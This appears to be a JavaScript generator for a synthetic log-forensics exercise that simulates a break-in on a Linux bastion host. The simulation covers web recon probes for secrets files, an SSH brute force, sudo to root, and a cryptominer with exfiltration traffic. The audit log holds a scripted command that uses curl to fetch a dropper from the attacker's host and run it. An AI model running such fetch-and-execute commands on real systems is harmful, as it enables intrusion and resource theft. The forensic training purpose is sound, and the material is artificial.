// Builds /home/analyst/arena from the seed. Pure: same seed, same bytes, in every browser and in Node.
// Each log source draws from its own random stream, so adding noise to one never shifts another.
// The output is a list of tar entries plus the files the guest must gzip (see tools/image/loghunt-seed).

import { SEED, NOW, HOST, HOST_IP, ATTACKER, TIMELINE, STAFF, WEB_CLIENTS, METRIC_HOSTS } from './story.js';
import { rng, apacheTime, syslogTime, isoTime, appTime, sarTime, sarDate, auditStamp } from './gen-util.js';
import { TRAINING, TRAINING_MTIME } from './training-files.js';
import { createTar } from './tar.js';

const encoder = new TextEncoder();
const T = (mo, d, h = 0, mi = 0, s = 0) => Date.UTC(2026, mo - 1, d, h, mi, s) / 1000;

// Log windows. logrotate runs at 03:12 on RHEL-like hosts in this story.
const MAR12 = T(3, 12);
const MAR13 = T(3, 13);
const MAR14 = T(3, 14);
const ROTATE = T(3, 13, 3, 12);

function stream(seed, name) {
  let h = seed >>> 0;
  for (const ch of name) h = Math.imul(h ^ ch.charCodeAt(0), 16777619) >>> 0;
  return rng(h);
}

// Collects [time, text] events and renders them in time order (insertion order breaks ties).
class Log {
  #events = [];
  add(ts, text) {
    this.#events.push([ts, this.#events.length, text]);
  }
  get last() {
    return this.#events.reduce((max, [ts]) => Math.max(max, ts), 0);
  }
  render() {
    return this.#events.sort((a, b) => a[0] - b[0] || a[1] - b[1]).map(([, , text]) => `${text}\n`).join('');
  }
}

const sys = (ts, proc, msg) => `${syslogTime(ts)} ${HOST} ${proc}: ${msg}`;

// ---------------------------------------------------------------- web (Apache combined format)

const BROWSERS = [
  'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
  'curl/8.5.0',
];
const PAGES = [
  ['/', 30, 5312], ['/login', 12, 2210], ['/static/app.js', 14, 48211], ['/static/style.css', 14, 1840],
  ['/static/logo.png', 8, 10240], ['/api/v1/orders', 10, 912], ['/api/v1/cart', 6, 431], ['/docs/', 3, 7830],
  ['/favicon.ico', 3, 196],
];
const PROBES = [
  '/admin/', '/administrator/', '/wp-login.php', '/wp-admin/', '/.env', '/.git/config', '/.git/HEAD', '/phpmyadmin/',
  '/pma/', '/server-status', '/server-info', '/cgi-bin/', '/cgi-bin/test.cgi', '/backup.zip', '/backup.tar.gz',
  '/db.sql', '/config.php.bak', '/config.yml', '/.htaccess', '/.htpasswd', '/web.config', '/console/', '/manager/html',
  '/actuator/env', '/solr/', '/jenkins/', '/.DS_Store', '/id_rsa', '/.ssh/authorized_keys', '/shell.php', '/test.php',
  '/info.php', '/phpinfo.php', '/old/', '/temp/', '/uploads/', '/robots.txt', '/sitemap.xml', '/', '/login',
];
const PROBE_STATUS = { '/': [200, 5312], '/login': [200, 2210], '/robots.txt': [200, 68], '/server-status': [403, 199], '/.git/config': [403, 199], '/.git/HEAD': [403, 199], '/cgi-bin/': [403, 199], '/.htaccess': [403, 199], '/.htpasswd': [403, 199] };

const combined = (ip, ts, method, path, status, bytes, ua, referer = '-') =>
  `${ip} - - [${apacheTime(ts)}] "${method} ${path} HTTP/1.1" ${status} ${bytes} "${referer}" "${ua}"`;

function web(seed) {
  const r = stream(seed, 'web');
  const files = [
    ['var/log/httpd/access_log.2', MAR12, MAR13],
    ['var/log/httpd/access_log.1', MAR13, MAR14],
    ['var/log/httpd/access_log', MAR14, NOW],
  ].map(([path, from, to]) => ({ path, from, to, log: new Log() }));

  for (const f of files) {
    for (let t = f.from + r.int(1, 30); t < f.to; t += r.int(4, 50)) {
      const ip = r.pick(WEB_CLIENTS);
      const [path, , size] = r.weighted(PAGES.map((p) => [p, p[1]]));
      const method = path === '/login' && r.chance(0.4) ? 'POST' : 'GET';
      let status = path === '/favicon.ico' ? 404 : r.weighted([[200, 90], [304, 6], [404, 2], [500, 1], [302, 1]]);
      if (method === 'POST') status = 302;
      const bytes = status === 304 || status === 302 ? '-' : status === 404 ? 196 : status === 500 ? 87 : size + r.int(0, 40);
      const referer = path.startsWith('/static') ? 'https://www.example.com/' : '-';
      f.log.add(t, combined(ip, t, method, path, status, bytes, r.pick(BROWSERS), referer));
    }
    // Monitoring hits the status endpoint every minute: steady, boring, and easy to filter out.
    for (let t = f.from + 30; t < f.to; t += 60) {
      f.log.add(t, combined('198.51.100.40', t, 'GET', '/api/v1/status', 200, 17, 'check_http/v2.4.7 (monitoring-plugins 2.4.7)'));
    }
  }

  // Two days early, one quiet request. It lands in the compressed rotation, so plain grep misses it.
  files[0].log.add(TIMELINE.firstProbe, combined(ATTACKER.ip, TIMELINE.firstProbe, 'GET', '/robots.txt', 200, 68, ATTACKER.userAgent));

  // The recon burst: every probe path, some twice, HEAD and OPTIONS mixed in.
  const burst = [];
  for (const path of PROBES) {
    burst.push(['GET', path]);
    if (r.chance(0.6)) burst.push([r.pick(['HEAD', 'GET', 'OPTIONS']), path.endsWith('/') ? `${path}index.php` : `${path}~`]);
  }
  const span = TIMELINE.reconEnd - TIMELINE.reconStart;
  burst.forEach(([method, path], i) => {
    const ts = TIMELINE.reconStart + Math.round((span * i) / (burst.length - 1));
    const [status, bytes] = PROBE_STATUS[path] ?? [404, 196];
    files[1].log.add(ts, combined(ATTACKER.ip, ts, method, path, status, method === 'HEAD' ? '-' : bytes, ATTACKER.userAgent));
  });

  const errors = new Log();
  burst.filter(([, path]) => (PROBE_STATUS[path]?.[0] ?? 404) === 403).forEach(([, path], i) => {
    const ts = TIMELINE.reconStart + 20 + i * 9;
    errors.add(ts, `[${new Date(ts * 1000).toUTCString().replace(/^(\w+), (\d+) (\w+) (\d+) ([\d:]+) GMT$/, '$1 $3 $2 $5.000000 $4')}] [authz_core:error] [pid 2311:tid 2389] [client ${ATTACKER.ip}:${40000 + i}] AH01630: client denied by server configuration: /var/www/html${path}`);
  });

  return [
    ...files.map((f) => ({ path: f.path, text: f.log.render(), mtime: f.log.last })),
    { path: 'var/log/httpd/error_log', text: errors.render(), mtime: errors.last },
  ];
}

// ---------------------------------------------------------------- secure (sshd, sudo, su)

function secure(seed) {
  const r = stream(seed, 'secure');
  const older = new Log();
  const current = new Log();
  const logFor = (ts) => (ts < ROTATE ? older : current);
  const add = (ts, proc, msg) => logFor(ts).add(ts, sys(ts, proc, msg));
  const pid = () => r.int(1200, 29999);

  // Staff: key-based logins during the day, a few sudo commands each, sessions that close.
  for (let day = MAR12; day < NOW; day += 86400) {
    for (const s of STAFF) {
      for (let n = r.int(2, 4); n > 0; n--) {
        const login = day + r.int(6 * 3600, 20 * 3600);
        if (login >= NOW) continue;
        const p = pid();
        const port = r.int(49152, 65000);
        add(login, `sshd[${p}]`, `Accepted publickey for ${s.user} from ${s.ip} port ${port} ssh2: ED25519 SHA256:${s.user.slice(4, 7)}Fq0example`);
        add(login, `sshd[${p}]`, `pam_unix(sshd:session): session opened for user ${s.user}(uid=${s.uid}) by ${s.user}(uid=0)`);
        for (let k = r.int(0, 3); k > 0; k--) {
          const ts = login + r.int(60, 1800);
          if (ts >= NOW) continue;
          const cmd = r.pick(['/usr/bin/systemctl restart httpd', '/usr/bin/systemctl status httpd', '/usr/bin/dnf check-update', '/usr/bin/journalctl -u httpd --since today', '/usr/bin/tail -n 100 /var/log/httpd/error_log']);
          add(ts, `sudo[${pid()}]`, `${s.user} : TTY=pts/${r.int(0, 3)} ; PWD=/home/${s.user} ; USER=root ; COMMAND=${cmd}`);
          add(ts, `sudo[${pid()}]`, `pam_unix(sudo:session): session opened for user root(uid=0) by ${s.user}(uid=${s.uid})`);
        }
        if (s.user === 'dev_carol' && r.chance(0.5)) {
          const ts = login + r.int(100, 900);
          if (ts < NOW) add(ts, `su[${pid()}]`, `pam_unix(su-l:session): session opened for user root(uid=0) by ${s.user}(uid=${s.uid})`);
        }
        const out = login + r.int(1900, 5400);
        if (out < NOW) add(out, `sshd[${p}]`, `pam_unix(sshd:session): session closed for user ${s.user}`);
      }
    }
  }

  // Internet background noise: short password-guessing runs from other addresses.
  for (const ip of ['192.0.2.201', '192.0.2.233', '203.0.113.140', '198.51.100.250']) {
    let t = MAR12 + r.int(0, 30 * 3600);
    for (let n = r.int(3, 9); n > 0; n--, t += r.int(2, 9)) {
      const p = pid();
      const port = r.int(30000, 60000);
      const user = r.pick(['root', 'root', 'admin', 'user']);
      if (user === 'root') add(t, `sshd[${p}]`, `Failed password for root from ${ip} port ${port} ssh2`);
      else {
        add(t, `sshd[${p}]`, `Invalid user ${user} from ${ip} port ${port}`);
        add(t, `sshd[${p}]`, `Failed password for invalid user ${user} from ${ip} port ${port} ssh2`);
      }
    }
    add(t, `sshd[${pid()}]`, `Connection closed by authenticating user root ${ip} port ${r.int(30000, 60000)} [preauth]`);
  }

  // The brute force: invalid users, then the real service account, then success.
  const guesses = [];
  for (let i = 0; i < 64; i++) guesses.push(i > 52 && i % 3 === 0 ? ATTACKER.victim : r.pick([...ATTACKER.guessedUsers, 'root']));
  const span = TIMELINE.bruteEnd - TIMELINE.bruteStart;
  guesses.forEach((user, i) => {
    const ts = TIMELINE.bruteStart + Math.round((span * i) / (guesses.length - 1));
    const p = pid();
    const port = 40000 + i * 7;
    if (user === ATTACKER.victim || user === 'root') add(ts, `sshd[${p}]`, `Failed password for ${user} from ${ATTACKER.ip} port ${port} ssh2`);
    else {
      add(ts, `sshd[${p}]`, `Invalid user ${user} from ${ATTACKER.ip} port ${port}`);
      add(ts, `sshd[${p}]`, `Failed password for invalid user ${user} from ${ATTACKER.ip} port ${port} ssh2`);
    }
  });
  const sshd = `sshd[${pid()}]`;
  add(TIMELINE.login, sshd, `Accepted password for ${ATTACKER.victim} from ${ATTACKER.ip} port 51122 ssh2`);
  add(TIMELINE.login, sshd, `pam_unix(sshd:session): session opened for user ${ATTACKER.victim}(uid=${ATTACKER.victimUid}) by ${ATTACKER.victim}(uid=0)`);
  const home = `/home/${ATTACKER.victim}`;
  add(TIMELINE.sudo, `sudo[${pid()}]`, `${ATTACKER.victim} : TTY=pts/1 ; PWD=${home} ; USER=root ; COMMAND=/bin/bash`);
  add(TIMELINE.sudo, `sudo[${pid()}]`, `pam_unix(sudo:session): session opened for user root(uid=0) by ${ATTACKER.victim}(uid=${ATTACKER.victimUid})`);
  add(TIMELINE.exfilEnd + 300, sshd, `pam_unix(sshd:session): session closed for user ${ATTACKER.victim}`);

  return [
    { path: 'var/log/secure-20260313', text: older.render(), mtime: ROTATE },
    { path: 'var/log/secure', text: current.render(), mtime: current.last },
  ];
}

// ---------------------------------------------------------------- messages (syslog, mixed facilities)

function messages(seed) {
  const r = stream(seed, 'messages');
  const log = new Log();
  const add = (ts, proc, msg) => log.add(ts, sys(ts, proc, msg));
  let session = 30;
  const templates = [
    () => ['systemd[1]', 'Starting dnf makecache.service - dnf makecache...'],
    () => ['systemd[1]', 'dnf-makecache.service: Deactivated successfully.'],
    () => ['chronyd[812]', `Selected source 192.0.2.123 (2.rhel.pool.ntp.org)`],
    () => ['NetworkManager[901]', `<info>  [${r.int(1773370000, 1773450000)}.${r.int(1000, 9999)}] dhcp4 (eth0): state changed new lease, address=${HOST_IP}`],
    () => ['kernel', `hrtimer: interrupt took ${r.int(90000, 190000)} ns`],
    () => ['kernel', 'XFS (dm-2): Metadata CRC error detected at xfs_dir3_block_read_verify+0x9e/0xc0 [xfs], xfs_dir3_block block 0x2f0'],
    () => ['systemd-logind[790]', `New session ${++session} of user ${r.pick(STAFF).user}.`],
    () => ['systemd[1]', `Started Session ${session} of User ${r.pick(STAFF).user}.`],
    () => ['rsyslogd[1012]', 'imjournal: journal files changed, reloading...  [v8.2310.0-4.el9 try https://www.rsyslog.com/e/0 ]'],
    () => ['auditd[742]', 'Audit daemon rotating log files'],
  ];
  for (let t = ROTATE + r.int(5, 60); t < NOW; t += r.int(120, 600)) {
    const [proc, msg] = r.pick(templates)();
    add(t, proc, msg);
  }
  add(ROTATE, 'rsyslogd[1012]', '[origin software="rsyslogd" swVersion="8.2310.0-4.el9" x-pid="1012" x-info="https://www.rsyslog.com"] rsyslogd was HUPed');
  add(TIMELINE.login + 1, 'systemd-logind[790]', `New session 41 of user ${ATTACKER.victim}.`);
  add(TIMELINE.login + 1, 'systemd[1]', `Started Session 41 of User ${ATTACKER.victim}.`);
  // The miner pegs the CPU: the kernel starts complaining about slow interrupts.
  for (let t = TIMELINE.execute + 90; t < TIMELINE.exfilEnd; t += r.int(400, 900)) {
    add(t, 'kernel', `perf: interrupt took too long (${r.int(2501, 6100)} > 2500), lowering kernel.perf_event_max_sample_rate to ${r.int(31, 79) * 1000}`);
  }
  add(TIMELINE.exfilEnd + 300, 'systemd-logind[790]', 'Session 41 logged out. Waiting for processes to exit.');
  return [{ path: 'var/log/messages', text: log.render(), mtime: log.last }];
}

// ---------------------------------------------------------------- firewall (iptables/nftables key=value)

function firewall(seed) {
  const r = stream(seed, 'firewall');
  const log = new Log();
  const add = (ts, prefix, fields) => log.add(ts, sys(ts, 'kernel', `${prefix}: ${fields}`));
  const tcp = (inIf, outIf, src, dst, len, ttl, spt, dpt, flags) =>
    `IN=${inIf} OUT=${outIf} SRC=${src} DST=${dst} LEN=${len} TOS=0x00 PREC=0x00 TTL=${ttl} ID=${r.int(1, 65535)} DF PROTO=TCP SPT=${spt} DPT=${dpt} WINDOW=${r.pick([64240, 29200, 1024])} RES=0x00 ${flags} URGP=0`;
  // UDP lines carry LEN twice (IP length, then UDP length): a classic trap for naive key=value parsing.
  const udp = (src, dst, spt, dpt) => {
    const len = r.int(60, 120);
    return `IN= OUT=eth0 SRC=${src} DST=${dst} LEN=${len} TOS=0x00 PREC=0x00 TTL=64 ID=${r.int(1, 65535)} DF PROTO=UDP SPT=${spt} DPT=${dpt} LEN=${len - 20}`;
  };

  for (let t = MAR13 + r.int(1, 20); t < NOW; t += r.int(8, 70)) {
    const kind = r.weighted([['dns', 40], ['https', 25], ['ntp', 5], ['reject', 30]]);
    if (kind === 'dns') add(t, 'FW-OUT', udp(HOST_IP, '192.0.2.53', r.int(32768, 60999), 53));
    else if (kind === 'ntp') add(t, 'FW-OUT', udp(HOST_IP, '192.0.2.123', 123, 123));
    else if (kind === 'https') add(t, 'FW-OUT', tcp('', 'eth0', HOST_IP, r.pick(['192.0.2.80', '198.51.100.60']), 60, 64, r.int(32768, 60999), 443, 'SYN'));
    else add(t, 'FINAL_REJECT', tcp('eth0', '', r.pick(['192.0.2.201', '192.0.2.233', '203.0.113.140', '203.0.113.7', '198.51.100.250']), HOST_IP, 44, r.int(40, 250), r.int(1024, 65000), r.pick([23, 445, 3389, 5900, 8080, 1433, 6379]), 'SYN'));
  }
  // Inbound SSH accepts: staff, then the attacker's successful login.
  for (const s of STAFF) {
    for (let n = 3; n > 0; n--) {
      const t = MAR13 + r.int(6 * 3600, 26 * 3600);
      if (t < NOW) add(t, 'FW-IN', tcp('eth0', '', s.ip, HOST_IP, 60, 64, r.int(49152, 65000), 22, 'SYN'));
    }
  }
  add(TIMELINE.bruteStart, 'FW-IN', tcp('eth0', '', ATTACKER.ip, HOST_IP, 60, 52, 40000, 22, 'SYN'));
  add(TIMELINE.login, 'FW-IN', tcp('eth0', '', ATTACKER.ip, HOST_IP, 60, 52, 51122, 22, 'SYN'));
  // The download of the dropper, then the long exfil stream on one connection.
  add(TIMELINE.execute - 40, 'FW-OUT', tcp('', 'eth0', HOST_IP, ATTACKER.ip, 60, 64, 47710, 8000, 'SYN'));
  for (let t = TIMELINE.exfilStart; t <= TIMELINE.exfilEnd; t += r.int(15, 45)) {
    add(t, 'FW-OUT', tcp('', 'eth0', HOST_IP, ATTACKER.ip, 1500, 64, 48812, ATTACKER.exfilPort, 'ACK PSH'));
  }
  return [{ path: 'var/log/firewalld/fw.log', text: log.render(), mtime: log.last }];
}

// ---------------------------------------------------------------- auditd

function audit(seed) {
  const r = stream(seed, 'audit');
  const log = new Log();
  let serial = 18000;
  const stampFor = (ts) => auditStamp(ts, r.int(0, 999), ++serial);
  const subj = 'unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023';

  function execve(ts, { auid, uid, ses, tty, exe, argv }) {
    const stamp = stampFor(ts);
    const comm = exe.split('/').pop().slice(0, 15);
    log.add(ts, `type=SYSCALL msg=${stamp}: arch=c000003e syscall=59 success=yes exit=0 ppid=${r.int(1000, 30000)} pid=${r.int(1000, 30000)} auid=${auid} uid=${uid} gid=${uid} euid=${uid} suid=${uid} fsuid=${uid} egid=${uid} sgid=${uid} fsgid=${uid} tty=${tty} ses=${ses} comm="${comm}" exe="${exe}" subj=${subj} key="exec"`);
    log.add(ts, `type=EXECVE msg=${stamp}: argc=${argv.length} ${argv.map((a, i) => `a${i}="${a}"`).join(' ')}`);
  }
  function login(ts, { auid, ses, id, acct, addr, ok }) {
    const who = id !== undefined ? `id=${id}` : `acct="${acct}"`;
    log.add(ts, `type=USER_LOGIN msg=${stampFor(ts)}: pid=${r.int(1000, 30000)} uid=0 auid=${auid} ses=${ses} subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=login ${who} exe="/usr/sbin/sshd" hostname=? addr=${addr} terminal=${ok ? `/dev/pts/${r.int(0, 3)}` : 'ssh'} res=${ok ? 'success' : 'failed'}'`);
  }

  const commands = [
    ['/usr/bin/systemctl', ['systemctl', 'status', 'httpd']], ['/usr/bin/ls', ['ls', '-la', '/var/www/html']],
    ['/usr/bin/grep', ['grep', '-i', 'error', '/var/log/httpd/error_log']], ['/usr/bin/tail', ['tail', '-n', '50', '/var/log/messages']],
    ['/usr/bin/dnf', ['dnf', 'check-update']], ['/usr/bin/df', ['df', '-h']], ['/usr/bin/ss', ['ss', '-tlnp']],
  ];
  let ses = 20;
  for (let t = ROTATE + r.int(600, 3600); t < NOW; t += r.int(900, 4200)) {
    const s = r.pick(STAFF);
    ses += 1;
    login(t, { auid: s.uid, ses, id: s.uid, addr: s.ip, ok: true });
    for (let k = r.int(1, 4), ts = t; k > 0; k--) {
      ts += r.int(20, 400);
      if (ts >= NOW) break;
      const [exe, argv] = r.pick(commands);
      execve(ts, { auid: s.uid, uid: r.chance(0.5) ? 0 : s.uid, ses, tty: `pts${r.int(0, 3)}`, exe, argv });
    }
  }

  // Failed logins during the brute force: auditd records them as acct="(invalid user)" or the real name.
  for (let t = TIMELINE.bruteStart; t <= TIMELINE.bruteEnd; t += 37) {
    login(t, { auid: 4294967295, ses: 4294967295, acct: t > TIMELINE.bruteEnd - 120 ? ATTACKER.victim : '(invalid user)', addr: ATTACKER.ip, ok: false });
  }
  const v = { auid: ATTACKER.victimUid, ses: 41 };
  login(TIMELINE.login, { ...v, id: ATTACKER.victimUid, addr: ATTACKER.ip, ok: true });
  log.add(TIMELINE.sudo, `type=USER_CMD msg=${stampFor(TIMELINE.sudo)}: pid=${r.int(1000, 30000)} uid=${ATTACKER.victimUid} auid=${ATTACKER.victimUid} ses=41 subj=${subj} msg='cwd="/home/${ATTACKER.victim}" cmd="/bin/bash" exe="/usr/bin/sudo" terminal=pts/1 res=success'`);
  execve(TIMELINE.execute - 40, { ...v, uid: 0, tty: 'pts1', exe: '/usr/bin/curl', argv: ['curl', '-so', ATTACKER.dropper, `http://${ATTACKER.ip}:8000/k`] });
  execve(TIMELINE.execute - 20, { ...v, uid: 0, tty: 'pts1', exe: '/usr/bin/chmod', argv: ['chmod', '+x', ATTACKER.dropper] });
  execve(TIMELINE.execute, { ...v, uid: 0, tty: 'pts1', exe: ATTACKER.dropper, argv: [ATTACKER.dropper, '--pool', `${ATTACKER.ip}:${ATTACKER.exfilPort}`, '--quiet'] });

  return [{ path: 'var/log/audit/audit.log', text: log.render(), mtime: log.last }];
}

// ---------------------------------------------------------------- application log (multi-line)

const LOGGERS = ['c.e.payments.Gateway', 'c.e.payments.OrderService', 'c.e.auth.TokenFilter', 'c.e.db.Pool', 'c.e.web.Health'];
const FRAMES = [
  'com.example.payments.Gateway.charge(Gateway.java:142)', 'com.example.payments.OrderService.submit(OrderService.java:88)',
  'com.example.web.OrderController.create(OrderController.java:51)', 'org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197)',
  'com.example.db.Pool.borrow(Pool.java:63)', 'java.base/java.net.SocketInputStream.read(SocketInputStream.java:168)',
];

function appLog(r, from, to, { busy = null } = {}) {
  const log = new Log();
  for (let t = from + r.int(1, 30); t < to; t += r.int(10, 90)) {
    const inBusy = busy && t >= busy[0] && t <= busy[1];
    const level = r.weighted([['INFO', 70], ['DEBUG', 15], ['WARN', inBusy ? 40 : 10], ['ERROR', 5]]);
    const thread = r.chance(0.8) ? `http-nio-8080-exec-${r.int(1, 12)}` : 'scheduler-1';
    const logger = r.pick(LOGGERS);
    const head = `${appTime(t, r.int(0, 999))} ${level.padEnd(5)} [${thread}] ${logger} - `;
    let msg;
    if (level === 'INFO') msg = r.pick([`Order ${r.int(100000, 999999)} accepted`, `Token refreshed for client ${r.int(10, 99)}`, 'Health check OK', `Pool stats active=${r.int(1, 20)} idle=${r.int(0, 10)}`]);
    else if (level === 'DEBUG') msg = `Cache ${r.pick(['hit', 'miss'])} key=order:${r.int(100000, 999999)}`;
    else if (level === 'WARN') msg = inBusy ? `Upstream latency ${r.int(1800, 4200)}ms exceeds threshold 1000ms` : `Retrying request to gateway (attempt ${r.int(2, 3)})`;
    else msg = r.pick(['Payment gateway call failed', 'Could not borrow connection from pool', 'Unhandled exception in request']);
    let text = head + msg;
    if (level === 'ERROR') {
      const ex = r.pick(['java.net.SocketTimeoutException: Read timed out', 'java.sql.SQLTransientConnectionException: Pool exhausted', 'java.lang.IllegalStateException: Order already submitted']);
      // A consecutive run of the call stack, deepest frame first, as the JVM prints it.
      const depth = r.int(3, FRAMES.length);
      const frames = FRAMES.slice(FRAMES.length - depth).reverse().map((f) => `\tat ${f}`);
      text += `\n${ex}\n${frames.join('\n')}`;
      if (r.chance(0.5)) text += `\nCaused by: java.io.IOException: Connection reset\n\tat ${r.pick(FRAMES)}\n\t... ${r.int(8, 30)} more`;
    }
    log.add(t, text);
  }
  return log;
}

function application(seed) {
  const r = stream(seed, 'app');
  const current = appLog(r, T(3, 13, 6), NOW, { busy: [TIMELINE.exfilStart, TIMELINE.exfilEnd] });
  const older = appLog(r, T(3, 12, 6), T(3, 12, 12));
  const debug = Array.from({ length: 30 }, (_, i) => `${appTime(T(3, 11, 9) + i * 61, (i * 37) % 1000)} DEBUG [main] c.e.boot.Startup - step ${i + 1} ok\n`).join('');
  return [
    { path: 'opt/app/logs/app.log', text: current.render(), mtime: current.last },
    { path: 'opt/app/logs/app old.log', text: older.render(), mtime: older.last },
    // Misleading extension: plain text named .gz. `zcat` fails on it; `file` tells the truth.
    { path: 'opt/app/logs/debug.log.gz', text: debug, mtime: T(3, 11, 9, 31) },
  ];
}

// ---------------------------------------------------------------- metrics

function metrics(seed) {
  const r = stream(seed, 'metrics');
  const rows = [];
  const base = {
    'bastion-7': { cpu: [3, 12], mem: [28, 34], io: [5, 40], tx: [150_000, 400_000] },
    'web-01': { cpu: [20, 45], mem: [55, 68], io: [90, 200], tx: [5_000_000, 12_000_000] },
    'web-02': { cpu: [18, 42], mem: [54, 66], io: [80, 190], tx: [4_500_000, 11_000_000] },
    'db-01': { cpu: [30, 60], mem: [70, 82], io: [400, 900], tx: [1_000_000, 3_000_000] },
  };
  const range = ([lo, hi]) => lo + r.next() * (hi - lo);
  for (let t = MAR13; t < NOW; t += 300) {
    for (const host of METRIC_HOSTS) {
      const b = base[host];
      const spiking = host === 'bastion-7' && t >= TIMELINE.exfilStart && t <= TIMELINE.exfilEnd;
      const cpu = spiking ? range([88, 99.5]) : range(b.cpu);
      const tx = spiking ? range([40_000_000, 75_000_000]) : range(b.tx);
      rows.push(`${isoTime(t)},${host},${cpu.toFixed(1)},${range(b.mem).toFixed(1)},${Math.round(range(b.io))},${Math.round(tx)}`);
    }
  }
  // Malformed rows a real collector produces: a truncated write, a sensor gap, a blank line, a repeated
  // header after a collector restart, a missing host, and a row with an extra column.
  const header = 'timestamp,host,cpu,mem,disk_io,net_tx_bytes';
  const broken = [
    (row) => row.split(',').slice(0, 4).join(','),
    (row) => row.replace(/^([^,]+,[^,]+),[^,]+/, '$1,N/A'),
    () => '',
    () => header,
    (row) => row.replace(/^([^,]+),[^,]+/, '$1,'),
    (row) => `${row},retry`,
  ];
  const positions = new Set();
  while (positions.size < broken.length) positions.add(r.int(20, rows.length - 20));
  [...positions].sort((a, b) => b - a).forEach((at, i) => rows.splice(at, 0, broken[i](rows[at])));
  const csv = `${header}\n${rows.join('\n')}\n`;

  // hosts.csv was exported from a Windows inventory tool: CRLF line endings.
  const hosts = ['host,ip,role,owner', `bastion-7,${HOST_IP},jump,ops_alice`, 'web-01,198.51.100.11,web,ops_bob', 'web-02,198.51.100.12,web,ops_bob', 'db-01,198.51.100.13,database,dev_carol'];

  // sar -u for bastion-7 on Mar 13, 12-hour clock, fixed-width columns.
  const num = (v) => v.toFixed(2).padStart(10);
  const sar = [`Linux 5.14.0-427.13.1.el9_4.x86_64 (${HOST}) \t${sarDate(MAR13)} \t_x86_64_\t(4 CPU)`, ''];
  sar.push(`${sarTime(MAR13 + 1)}     CPU     %user     %nice   %system   %iowait    %steal     %idle`);
  const totals = [0, 0, 0, 0, 0, 0];
  let count = 0;
  for (let t = MAR13 + 601; t < MAR14; t += 600) {
    const spiking = t >= TIMELINE.exfilStart;
    const user = spiking ? range([78, 91]) : range([1.5, 9]);
    const system = spiking ? range([5, 8]) : range([0.5, 2.5]);
    const iowait = range([0.05, 1.2]);
    const values = [user, 0, system, iowait, 0, 100 - user - system - iowait];
    values.forEach((v, i) => { totals[i] += Number(v.toFixed(2)); });
    count += 1;
    sar.push(`${sarTime(t)}     all${values.map(num).join('')}`);
  }
  sar.push(`Average:        all${totals.map((v) => num(v / count)).join('')}`);

  return [
    { path: 'metrics/node_metrics.csv', text: csv, mtime: NOW - 120 },
    { path: 'metrics/hosts.csv', text: `${hosts.join('\r\n')}\r\n`, mtime: T(3, 1, 12) },
    { path: 'metrics/sar_cpu.txt', text: `${sar.join('\n')}\n`, mtime: MAR14 },
  ];
}

// ---------------------------------------------------------------- traps

function traps(seed) {
  const r = stream(seed, 'traps');
  const bytes = (n, prefix = []) => Uint8Array.from({ length: n }, (_, i) => (i < prefix.length ? prefix[i] : r.int(0, 255)));
  return [
    { path: 'var/log/maillog', data: new Uint8Array(0), mtime: T(3, 9, 3, 12) },
    { path: 'var/log/spooler', data: new Uint8Array(0), mtime: T(3, 9, 3, 12) },
    { path: 'var/log/wtmp', data: bytes(4608), mtime: TIMELINE.exfilEnd + 300 },
    { path: 'var/log/btmp', data: bytes(9216), mtime: TIMELINE.bruteEnd },
    // The dropper: an ELF header and noise, hidden in a dot-directory.
    { path: 'tmp/.x/kworkerd', data: bytes(18_432, [0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]), mtime: TIMELINE.execute - 40, mode: 0o755 },
    { path: 'opt/app/.cache/session.tmp', data: encoder.encode('token=expired\n'), mtime: T(3, 10, 8) },
  ];
}

// ---------------------------------------------------------------- assembly

export function generateArena(seed = SEED) {
  const textFiles = [web(seed), secure(seed), messages(seed), firewall(seed), audit(seed), application(seed), metrics(seed)].flat();
  const files = [
    ...textFiles.map(({ path, text, mtime }) => ({ path, data: encoder.encode(text), mtime })),
    ...traps(seed),
    ...Object.entries(TRAINING).map(([path, text]) => ({ path, data: encoder.encode(text), mtime: TRAINING_MTIME })),
  ];
  // A plain-named gzip file (misleading extension), made from a copy of the oldest access log.
  const oldest = files.find((f) => f.path === 'var/log/httpd/access_log.2');
  files.push({ path: 'var/log/httpd/old_access', data: oldest.data, mtime: T(3, 12, 23, 59, 58) });

  const dirs = new Set();
  for (const f of files) {
    const parts = f.path.split('/');
    for (let i = 1; i < parts.length; i++) dirs.add(parts.slice(0, i).join('/'));
  }
  const entries = [
    ...[...dirs].sort().map((path) => ({ path, dir: true, mtime: NOW - 600 })),
    ...files.sort((a, b) => (a.path < b.path ? -1 : a.path > b.path ? 1 : 0)),
  ];
  return {
    entries,
    gzip: [{ path: 'var/log/httpd/access_log.2' }, { path: 'var/log/httpd/old_access', final: 'var/log/httpd/old_access.txt' }],
    now: NOW,
  };
}

export function arenaTar(arena) {
  return createTar(arena.entries);
}
